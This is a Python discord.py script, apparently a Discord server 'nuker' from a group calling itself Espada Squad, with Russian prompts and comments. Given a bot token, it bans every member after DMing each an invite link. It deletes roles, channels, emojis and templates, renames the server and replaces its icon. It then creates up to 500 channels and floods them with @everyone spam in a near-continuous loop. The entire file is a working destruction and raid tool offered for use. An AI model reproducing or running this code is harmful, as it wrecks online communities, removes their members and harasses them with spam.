import discord
from discord.ext import tasks
import requests
import os
from colorama import Fore, init
from pystyle import Write, System, Colors, Colorate, Anime
intents = discord.Intents.all() 
client = discord.Client(intents=intents)
print("Espada Squad")
print("Dev: vodkadev.ru")
print("Ver: 1.0")
TOKEN = input("Токен бота: ")  # Убедитесь, что токен является строкой

print("4 - снос всего сервера и бан всех")
print("3 - снос всего сервера")
print("2 - удаление текстовых каналов и спам")
print("1 - смена названия аватарки и удаление всей хуйни")

try:
    Сила_сноса = int(input("Сила сноса: "))
except ValueError:
    print("Еблан, веди норм число")
    module_path = os.path.join('.',  f'main.py')
    if os.path.exists(module_path):
        System.Clear()
        os.system(f"cmd /c python {module_path}")
    else:
        print(f"Файл {module_path} не найден. Проверьте правильность пути и названия файла.")

if Сила_сноса not in [1, 2, 3, 4]:
    print("Еблан, веди норм все")
    module_path = os.path.join('.',  f'main.py')
    if os.path.exists(module_path):
        System.Clear()
        os.system(f"cmd /c python {module_path}")
    else:
        print(f"Файл {module_path} не найден. Проверьте правильность пути и названия файла.")

if Сила_сноса in [2, 3, 4]:
    try:
        Text = int(input("Сколько текстовых каналов создать: "))
        if Text > 500:
            print("Лимит дискорда видите меньше 500")
            Text = int(input("Сколько текстовых каналов создать: "))
            if Text == 0:
                print("Мало видите меньше 500")
                Text = int(input("Сколько текстовых каналов создать: "))
            if Text > 500:
                print("Лимит дискорда видите меньше 500")
                Text = int(input("Сколько текстовых каналов создать: "))
        if Text == 0:
            print("Мало видите меньше 500")
            Text = int(input("Сколько текстовых каналов создать: "))
            if Text == 0:
                print("Мало видите меньше 500")
                Text = int(input("Сколько текстовых каналов создать: "))
            if Text > 500:
                print("Лимит дискорда видите меньше 500")
                Text = int(input("Сколько текстовых каналов создать: "))
    except ValueError:
        print("Еблан, веди норм число")
        exit()
else:
    print("Без текстовых каналов")
@client.event
async def on_ready():
    guild = client.guilds[0]
    if Сила_сноса == 4:
        print(f'Logged in as {client.user}')

          # Получаем первый сервер (гильдию), к которому присоединился бот
        print(f"В бан, чёртики!...")
        ban = 0
        bany = 0
        wta = 0
        channel = guild.text_channels[0]
        invite = await channel.create_invite(max_age=0, max_uses=0, unique=True)
        print(F"{invite}")
        for member in guild.members:
                guild2=guild.name
                await member.send(f"Переезд епта https://discord.gg/espadasquad с {guild2}" )
                try:
                    ban += 1
                    await member.ban()
                    bany += 1
                    print(f" Не допущен! нет в вайтлисте: {member}")
                except:
                    print(f" Трабл с : {member}")
                    continue

        print(f"> Было: {ban}  человек, в вайтлисте: {wta}, а забанил: {bany}  человек .")
        for emoji in list(guild.emojis):
            try:
                await emoji.delete()
                print(f" Удалил этот трикалятый смайлик")
            except:
                print(f" Ошибка")
                continue 
        print(f"> Все, смайлов больше нет....")
        try:
            print(f" Чистим шаблоны")
            bebrus = await guild.templates()
            for template in bebrus:
                print(f" Шаблон почистил!")
                await template.delete()
            print(f"> Все шаблоны почистились!.")
        except:
            pass
        try:
            await guild.edit(name="Crash Espada")
        except discord.Forbidden:
            print("Бот не имеет права изменять название сервера.")
        except discord.HTTPException as e:
            print(f"Не удалось изменить название сервера: {e}")
        avatar_url = "https://cdn.discordapp.com/attachments/1211633042108710922/1215986552900157511/a_5be1e8f31ba0e8788bd7db6a801b07fc.gif?ex=664c873a&is=664b35ba&hm=9994b668fcaba70617b4c611a16251b2d120178ff3500a71bcd9a5bd86dcd3cb&"
        try:
            avatar_response = requests.get(avatar_url)
            if avatar_response.status_code == 200:
                await guild.edit(icon=avatar_response.content)
            else:
                print("Не удалось получить изображение аватарки по ссылке.")
        except discord.Forbidden:
            print("Бот не имеет прав на изменение аватарки сервера.")
        except discord.HTTPException as e:
            print(f"Не удалось изменить аватарку сервера: {e}")

        # Удаляем все роли
        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                except Exception as e:
                    print(f'Failed to delete role {role.name}: {e}')

        for channel in guild.channels:
            if channel.name.startswith("essential_"):
                continue
            
            if isinstance(channel, discord.CategoryChannel):
                for category in channel.channels:
                    if category.permissions_for(guild.me).manage_channels:
                        try:
                            await category.delete()
                            print(f"Удален категория {category.name}.")
                        except discord.NotFound:
                            print(f"Категория {category.name} не найден.")
                        except discord.Forbidden:
                            print(f"Бот не имеет права удалять категорию: {category.name}")
                        except discord.HTTPException as e:
                            print(f"Не удалось удалить категорию {category.name}: {e}")
                    else:
                        print(f"Бот не имеет права удалять категорию: {category.name}")

            if channel.permissions_for(guild.me).manage_channels:
                try:
                    await channel.delete()
                    print(f"Удален канал {channel.name}.")
                except discord.NotFound:
                    print(f"Канал {channel.name} не найден.")
                except discord.Forbidden:
                    print(f"Бот не имеет права удалять канал: {channel.name}")
                except discord.HTTPException as e:
                    print(f"Не удалось удалить канал {channel.name}: {e}")
            else:
                print(f"Бот не имеет права удалять канал: {channel.name}")

        # Начинаем отправлять сообщения каждую миллисекунду
        send_messages.start(text_channels)
    if Сила_сноса == 3:
        for emoji in list(guild.emojis):
            try:
                await emoji.delete()
                print(f" Удалил этот трикалятый смайлик")
            except:
                print(f" Ошибка")
                continue 
        print(f"> Все, смайлов больше нет....")
        try:
            print(f" Чистим шаблоны")
            bebrus = await guild.templates()
            for template in bebrus:
                print(f" Шаблон почистил!")
                await template.delete()
            print(f"> Все шаблоны почистились!.")
        except:
            pass
        try:
            await guild.edit(name="Crash Espada")
        except discord.Forbidden:
            print("Бот не имеет права изменять название сервера.")
        except discord.HTTPException as e:
            print(f"Не удалось изменить название сервера: {e}")
        avatar_url = "https://cdn.discordapp.com/attachments/1211633042108710922/1215986552900157511/a_5be1e8f31ba0e8788bd7db6a801b07fc.gif?ex=664c873a&is=664b35ba&hm=9994b668fcaba70617b4c611a16251b2d120178ff3500a71bcd9a5bd86dcd3cb&"
        try:
            avatar_response = requests.get(avatar_url)
            if avatar_response.status_code == 200:
                await guild.edit(icon=avatar_response.content)
            else:
                print("Не удалось получить изображение аватарки по ссылке.")
        except discord.Forbidden:
            print("Бот не имеет прав на изменение аватарки сервера.")
        except discord.HTTPException as e:
            print(f"Не удалось изменить аватарку сервера: {e}")

        # Удаляем все роли
        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete()
                except Exception as e:
                    print(f'Failed to delete role {role.name}: {e}')

        for channel in guild.channels:
            if channel.name.startswith("essential_"):
                continue
            
            if isinstance(channel, discord.CategoryChannel):
                for category in channel.channels:
                    if category.permissions_for(guild.me).manage_channels:
                        try:
                            await category.delete()
                            print(f"Удален категория {category.name}.")
                        except discord.NotFound:
                            print(f"Категория {category.name} не найден.")
                        except discord.Forbidden:
                            print(f"Бот не имеет права удалять категорию: {category.name}")
                        except discord.HTTPException as e:
                            print(f"Не удалось удалить категорию {category.name}: {e}")
                    else:
                        print(f"Бот не имеет права удалять категорию: {category.name}")

            if channel.permissions_for(guild.me).manage_channels:
                try:
                    await channel.delete()
                    print(f"Удален канал {channel.name}.")
                except discord.NotFound:
                    print(f"Канал {channel.name} не найден.")
                except discord.Forbidden:
                    print(f"Бот не имеет права удалять канал: {channel.name}")
                except discord.HTTPException as e:
                    print(f"Не удалось удалить канал {channel.name}: {e}")
            else:
                print(f"Бот не имеет права удалять канал: {channel.name}")

    # Создаем 10 каналов
        text_channels = []
        for i in range(Text):
            new_channel = await guild.create_text_channel(f'Crash Espada')
            await new_channel.send("@everyone переезд епта https://discord.gg/espadasquad")
            await new_channel.send("@everyone переезд епта https://discord.gg/espadasquad")
            await new_channel.send("@everyone переезд епта https://discord.gg/espadasquad")
            await new_channel.send("@everyone переезд епта https://discord.gg/espadasquad")
            text_channels.append(new_channel)

        send_messages.start(text_channels)
    if Сила_сноса == 2:
         for channel in guild.channels:
            if channel.name.startswith("essential_"):
                continue
            
            if isinstance(channel, discord.CategoryChannel):
                for category in channel.channels:
                    if category.permissions_for(guild.me).manage_channels:
                        try:
                            await category.delete()
                            print(f"Удален категория {category.name}.")
                        except discord.NotFound:
                            print(f"Категория {category.name} не найден.")
                        except discord.Forbidden:
                            print(f"Бот не имеет права удалять категорию: {category.name}")
                        except discord.HTTPException as e:
                            print(f"Не удалось удалить категорию {category.name}: {e}")
                    else:
                        print(f"Бот не имеет права удалять категорию: {category.name}")

            if channel.permissions_for(guild.me).manage_channels:
                try:
                    await channel.delete()
                    print(f"Удален канал {channel.name}.")
                except discord.NotFound:
                    print(f"Канал {channel.name} не найден.")
                except discord.Forbidden:
                    print(f"Бот не имеет права удалять канал: {channel.name}")
                except discord.HTTPException as e:
                    print(f"Не удалось удалить канал {channel.name}: {e}")
            else:
                print(f"Бот не имеет права удалять канал: {channel.name}")

        # Создаем 10 каналов
            text_channels = []
            for i in range(Text):
                new_channel = await guild.create_text_channel(f'Crash Espada')
                await new_channel.send("@everyone переезд епта https://discord.gg/espadasquad")
                await new_channel.send("@everyone переезд епта https://discord.gg/espadasquad")
                await new_channel.send("@everyone переезд епта https://discord.gg/espadasquad")
                await new_channel.send("@everyone переезд епта https://discord.gg/espadasquad")
                text_channels.append(new_channel)

            send_messages.start(text_channels)
    if Сила_сноса == 1:
        for emoji in list(guild.emojis):
            try:
                await emoji.delete()
                print(f" Удалил этот трикалятый смайлик")
            except:
                print(f" Ошибка")
                continue 
        print(f"> Все, смайлов больше нет....")
        try:
            print(f" Чистим шаблоны")
            bebrus = await guild.templates()
            for template in bebrus:
                print(f" Шаблон почистил!")
                await template.delete()
            print(f"> Все шаблоны почистились!.")
        except:
            pass
        try:
            await guild.edit(name="Crash Espada")
        except discord.Forbidden:
            print("Бот не имеет права изменять название сервера.")
        except discord.HTTPException as e:
            print(f"Не удалось изменить название сервера: {e}")
        avatar_url = "https://cdn.discordapp.com/attachments/1211633042108710922/1215986552900157511/a_5be1e8f31ba0e8788bd7db6a801b07fc.gif?ex=664c873a&is=664b35ba&hm=9994b668fcaba70617b4c611a16251b2d120178ff3500a71bcd9a5bd86dcd3cb&"
        try:
            avatar_response = requests.get(avatar_url)
            if avatar_response.status_code == 200:
                await guild.edit(icon=avatar_response.content)
            else:
                print("Не удалось получить изображение аватарки по ссылке.")
        except discord.Forbidden:
            print("Бот не имеет прав на изменение аватарки сервера.")
        except discord.HTTPException as e:
            print(f"Не удалось изменить аватарку сервера: {e}")

@tasks.loop(seconds=0.001)  # Это скорее всего слишком быстро для Discord и может привести к rate limiting
async def send_messages(channels):
    for channel in channels:
        await channel.send("@everyone переезд епта https://discord.gg/espadasquad")
        await channel.send("@everyone переезд епта https://discord.gg/espadasquad")
        await channel.send("@everyone переезд епта https://discord.gg/espadasquad")
        await channel.send("@everyone переезд епта https://discord.gg/espadasquad")

def main():
    try:
        client.run(TOKEN)
    except AttributeError as e:
        if "'int' object has no attribute 'strip'" in str(e):
            print("Ошибка: Токен должен быть строкой. Пожалуйста, проверьте ваш токен.")
        else:
            print("Произошла ошибка:", e)
    except discord.errors.LoginFailure:
        print("Ошибка: Неправильный токен. Пожалуйста, проверьте ваш токен.")
    except Exception as e:
        print("Произошла ошибка:", e)

if __name__ == "__main__":
    main()
